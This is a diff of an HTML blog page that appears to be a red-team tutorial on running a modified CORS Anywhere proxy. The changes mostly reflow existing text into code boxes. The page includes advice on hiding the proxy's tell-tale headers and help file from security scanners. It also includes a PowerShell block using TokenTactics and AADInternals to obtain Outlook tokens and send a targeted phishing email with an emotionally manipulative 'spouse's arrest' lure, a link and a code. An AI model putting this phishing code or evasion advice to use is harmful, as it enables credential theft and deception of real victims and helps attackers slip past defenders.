@@ -88,6 +88,22 @@
             text-align: center; /* Aligns text to center */
             border-radius: 10px; /* Optional, to make the box corners rounded */
         }
+        .codebox {
+    /* Below are styles for the codebox (not the code itself) */
+    border: 1px solid black;
+    background-color: #EEEEFF;
+    width: 300px;
+    overflow: auto;
+    padding: 10px;
+    margin: 0 auto; /* Add this line to center the codebox */
+}
+
+.codebox code {
+    /* Styles in here affect the text of the codebox */
+    font-size: 1.2em;
+    color: black; /* Set the font color to black */
+    /* You can add additional styles here if needed */
+}
     </style>
 </head>
 <!--  Start of Body -->
@@ -219,7 +235,38 @@
         <p class="center-block"></p>    
             I'm a big fan of Infrastructure-as-Code and have included some scripts to deploy the resources you need.
             Let's get something to work with, we need PowerShell, Azure CLI and the AWS CLI for later.
+            <p></p>
             <!-- Need a Code box here once we get it how we like it -->
+            <div class="codebox">
+                <code>   
+                    <!-- var message = "hello world!"; -->        
+                    <span class="comment"># Update the list of packages</span>
+                    <p></p>
+                    sudo apt-get update -y
+                    <p></p>
+                    <span class="comment"># Install pre-requisite packages.</span>
+                    <p></p>
+                    sudo apt-get install -y wget apt-transport-https software-properties-common azure-cli aws unzip
+                    <p></p>
+                    <span class="comment"># Download the Microsoft repository GPG keys</span>
+                    <p></p>
+                    wget -q "https://packages.microsoft.com/config/ubuntu/$(lsb_release -rs)/packages-microsoft-prod.deb"
+                    <p></p>
+                    <span class="comment"># Register the Microsoft repository GPG keys</span>
+                    <p></p>
+                    sudo dpkg -i packages-microsoft-prod.deb
+                    <p></p>
+                    <span class="comment"># Update the list of packages after we added packages.microsoft.com</span>
+                    <p></p>
+                    sudo apt-get update -y 
+                    <p></p>
+                    <span class="comment"># Install PowerShell</span>
+                    <p></p>
+                    sudo apt-get install -y powershell
+                    <p></p>
+                </code>
+            </div>
+
             <div class="text-box">
                     <span class="comment"># Update the list of packages</span>
 
@@ -307,17 +354,25 @@
             <p></p>
             <img class="article-image" src="assets/cors/serverjs1.png" alt="NodeJS Server">
             <p></p>
-                    1. Define the host and port for the CORS Anywhere server. The host is obtained from the HOST environment variable, defaulting to '0.0.0.0', and the port is obtained from the PORT environment variable, defaulting to 8080.
 
+            <div class="codebox">
+                <code>   
+                    <!-- var message = "hello world!"; -->        
+                    1. Define the host and port for the CORS Anywhere server. The host is obtained from the HOST environment variable, defaulting to '0.0.0.0', and the port is obtained from the PORT environment variable, defaulting to 8080.
+                    <p></p>
                     2. It parses the CORSANYWHERE_BLACKLIST and CORSANYWHERE_WHITELIST environment variables to determine the origin blacklist and whitelist.
-                    
+                    <p></p>
                     3. It requires the rate-limit module and initializes the checkRateLimit function using the CORSANYWHERE_RATELIMIT environment variable.
-                    
+                    <p></p>
                     4. It creates a CORS Anywhere server with our custom required headers 'straylight' and 'security' using the cors-anywhere library, providing configuration options such as originBlacklist, originWhitelist, checkRateLimit, removeHeaders, and httpProxyOptions.
-                    
-                    5. The server is then started by calling the listen method, passing the port, host, and a callback function that logs the server's address.
+                    <p></p>
+                    5. The server is then started by calling the listen method, passing the port, host, and a callback function that logs the server's address."
+                    <p></p>
+  
+                </code>
+            </div>
         <p></p>
-        I needed firewall rules open while developing this and decided to require a couple of headers to curb any abuse.
+        I needed firewall rules open while developing this and decided to require a couple of headers to curb any abuse."
         <img class="article-image" src="assets/cors/serverjs2.png" alt="NodeJS Server">
         <p></p>
         I'm showing you the modified version that is contained in the fork of CORS-Anywhere: https://github.com/mellosec/cors-anywhere. The original "server.js" and its help file are in a "references" folder in YOURCORS if you want to see what I changed and removed. The Help file was displayed as an HTTP response, though, it was a red flag we need to clear up. Using a proxy resolves the issue but it's completely removable if we look through the source. 
@@ -326,7 +381,7 @@
 
         <p></p>
         <div class="text-box">
-        <p class="center-block">
+        < class="center-block">
             <h2>IoCs and Watermarks</h2>
             It's important to be mindful of what our tools look like to anyone paying attention. Scanners are always scanning under the watchful eye of ATP and other security products. Palo Alto for example:
             <p></p>
@@ -342,19 +397,32 @@
             <img class="article-image" src="assets/cors/serverjs3.png" alt="Help.txt">
             <p></p>
             Every request needs the headers now to work. Let's test it.
+
+
+
+
             <p></p>
+            <div class="codebox">
+                <code>   
                     <span class="comment"># Test if it's requiring anything to proxy</span>
-
+                    <p></p>
                     curl http://127.0.0.1:8080/
-
+                    <p></p>
                     <span class="comment"># Test without Headers</span>
-
+                    <p></p>
                     curl http://127.0.0.1:8080/https://s3cur3th1ssh1t.github.io/
-
+                    <p></p>
                     <span class="comment"># Give S3cur3Th1sSh1t some love</span>
+                    <p></p>
+                    curl -H "straylight: value" -H "security: value" http://127.0.0.1:8080/https://s3cur3th1ssh1t.github.io/
+                    <p></p>
+                </code>
+            </div>
+            <p></p>
 
-                    curl -H "straylight: value" -H "security: value" http://127.0.0.1:8080/https://s3cur3th1ssh1t.github.io/>
-        <p></p>
+
+
+
         <img class="article-image" src="assets/cors/curl1.png" alt="Curl Tests">
         <p></p>
         We can fix that the response telling anyone which headers it's looking for, right?
@@ -421,32 +489,54 @@
             <p></p>
             <img class="article-image" src="assets/cors/graph1.png" alt="Graph Token">
             <!--  Code Section Needs to be updated with code box -->
+
+            <p></p>
+            <div class="codebox">
+                <code>   
+                    <span class="comment"> # Get your own access token and refresh it to Outlook </span>
+                    <p></p>
+                    <span class="comment"> # Targeted User and YOUR domain here </span>
+                    <p></p>
+                    $user = "victim@targeted.com"
+                    <p></p>
+                    $domain = "trusteddomain.com"                
+                    <p></p>
+                    <span class="comment"> # Get Graph Token with TokenTactics</span> 
+                    <p></p>
+                    Get-AzureToken -Client Graph
+                    <p></p>
+                    $access = $response.access_token          # $response object contains $access
+                    <p></p>
+                    $refresh = $response.refresh_token        # and $refresh token
+                    <p></p>
+                    Add-AADIntAccessTokenToCache -AccessToken $access -RefreshToken $refresh   
+                    <p></p>
+                    Write-Output "Refreshing to Outlook token and saving to AADInternals cache"
+                    <p></p>
+                    $outlook=RefreshTo-OutlookToken -domain $domain                             
+                    <p></p>
+                    Add-AADIntAccessTokenToCache -AccessToken $outlook.access_token -RefreshToken $outlook.refresh_token
+                    <p></p>
+                    <span class="comment"> # Send something </span>
+                    <p></p>
+                    $subject = "A legal document is awaiting your review"
+                    <p></p>
+                    $SpouseArrested = "A sensitive document regarding your spouse's arrest is awaiting your review, please follow this $link and enter $code when requested."
+                    <p></p>
+                    Send-AADIntOutlookMessage -AccessToken $outlook.access_token -Recipient $user -Subject $subject -Message $SpouseArrested
+                    <p></p>
+                    <span class="comment"> # Or use an HTML file </span>
+                    <p></p>
+                    $msg = Get-Content index.html -Raw
+                </code>
+            </div>
+            <p></p>
             <div class="text-box">        
                 <p class="center-block">
 
 
 
-                    <span class="comment"> # Get your own access token and refresh it to Outlook </span>
-                    <span class="comment"> # Targeted User and YOUR domain here </span>
-                    $user = "victim@targeted.com"
-                    $domain = "trusteddomain.com"                
 
-                    <span class="comment"> # Get Graph Token with TokenTactics</span> 
-                    Get-AzureToken -Client Graph
-                    $access = $response.access_token          # $response object contains $access
-                    $refresh = $response.refresh_token        # and $refresh token
-                    Add-AADIntAccessTokenToCache -AccessToken $access -RefreshToken $refresh   
-                    Write-Output "Refreshing to Outlook token and saving to AADInternals cache"
-                    $outlook=RefreshTo-OutlookToken -domain $domain                             
-                    Add-AADIntAccessTokenToCache -AccessToken $outlook.access_token -RefreshToken $outlook.refresh_token
-
-                     <span class="comment"> # Send something </span>
-                    $subject = "A legal document is awaiting your review"
-                    $SpouseArrested = "A sensitive document regarding your spouse's arrest is awaiting your review, please follow this $link and enter $code when requested."
-                    Send-AADIntOutlookMessage -AccessToken $outlook.access_token -Recipient $user -Subject $subject -Message $SpouseArrested
-
-                     <span class="comment"> # Or use an HTML file </span>
-                    $msg = Get-Content index.html -Raw
                     </p>
                     </div>                    
         </p>
